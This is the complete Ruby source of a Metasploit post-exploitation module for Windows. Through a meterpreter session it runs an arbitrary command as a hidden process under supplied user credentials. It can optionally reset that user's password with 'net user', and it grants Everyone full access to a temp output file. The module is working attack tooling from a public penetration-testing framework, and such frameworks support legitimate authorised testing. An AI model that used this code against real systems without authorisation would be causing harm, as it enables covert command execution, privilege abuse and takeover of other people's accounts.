##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Runas

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Windows Manage Run Command As User",
      'Description'          => %q(
        This module will login with the specified username/password and execute the
        supplied command as a hidden process. Output is not returned by default, by setting
        CMDOUT to true output will be redirected to a temp file and read back in to
        display. By setting advanced option SETPASS to true, it will reset the users
        password and then execute the command.
                            ),
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['Kx499']
    ))

    register_options(
      [
        OptString.new('DOMAIN', [true, 'Domain to login with' ]),
        OptString.new('USER', [true, 'Username to login with' ]),
        OptString.new('PASSWORD', [true, 'Password to login with' ]),
        OptString.new('CMD', [true, 'Command to execute' ]),
        OptBool.new('CMDOUT', [true, 'Retrieve command output', false])
      ])

    register_advanced_options(
      [
        OptBool.new('SETPASS', [true, 'Reset password', false])
      ])
  end

  # Check if sufficient privileges are present for certain actions and run getprivs for system
  # If you elevated privs to system,the SeAssignPrimaryTokenPrivilege will not be assigned. You
  # need to migrate to a process that is running as
  # system. If you don't have privs, this exits script.
  def priv_check
    if is_system?
      privs = session.sys.config.getprivs
      return privs.include?("SeAssignPrimaryTokenPrivilege") && privs.include?("SeIncreaseQuotaPrivilege")
    end

    false
  end

  def reset_pass(user, password)
    begin
      tmpout = cmd_exec("cmd.exe /c net user #{user} #{password}")
      return tmpout.include?("successfully")
    rescue
      return false
    end
  end

  def touch(path)
    write_file(path, "")
    cmd_exec("icacls #{path} /grant Everyone:(F)")
  end

  def run
    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return unless session.type == "meterpreter"

    pi = nil
    # check/set vars
    setpass = datastore["SETPASS"]
    cmdout = datastore["CMDOUT"]
    user = datastore["USER"] || nil
    password = datastore["PASSWORD"] || nil
    cmd = datastore["CMD"] || nil
    domain = datastore['DOMAIN']

    if setpass
      print_status("Setting user password")
      fail_with(Failure::Unknown, 'Error resetting password') unless reset_pass(user, password)
    end

    # If command output is requested, then create output file and set open permissions
    if cmdout
      system_temp = get_env('WINDIR') << '\\Temp'
      outpath = "#{system_temp}\\#{Rex::Text.rand_text_alpha(8)}.txt"
      touch(outpath)
      cmdstr = "cmd.exe /c #{cmd} > #{outpath}"
    else
      cmdstr = "cmd.exe /c #{cmd}"
    end

    # Check privs and execute the correct commands
    # if user use createprocesswithlogon, if system logonuser and createprocessasuser
    # execute command and get output with a poor mans pipe
    if priv_check
      print_status("Executing CreateProcessAsUserA...we are SYSTEM")
      pi = create_process_as_user(domain, user, password, nil, cmdstr)
      if pi
        session.railgun.kernel32.CloseHandle(pi[:process_handle])
        session.railgun.kernel32.CloseHandle(pi[:thread_handle])
      end
    else
      print_status("Executing CreateProcessWithLogonW...")
      pi = create_process_with_logon(domain, user, password, nil, cmdstr)
    end

    # Only process file if the process creation was successful, delete when done, give us info
    # about process
    if pi
      tmpout = read_file(outpath) if cmdout

      print_status("Command Run: #{cmdstr}")
      vprint_status("Process Handle: #{pi[:process_handle]}")
      vprint_status("Thread Handle: #{pi[:thread_handle]}")
      vprint_status("Process Id: #{pi[:process_id]}")
      vprint_status("Thread Id: #{pi[:thread_id]}")
      print_status("Command output:\r\n#{tmpout}") if cmdout
    end

    if cmdout
      print_status("Removing temp file #{outpath}")
      rm_f(outpath)
    end
  end
end
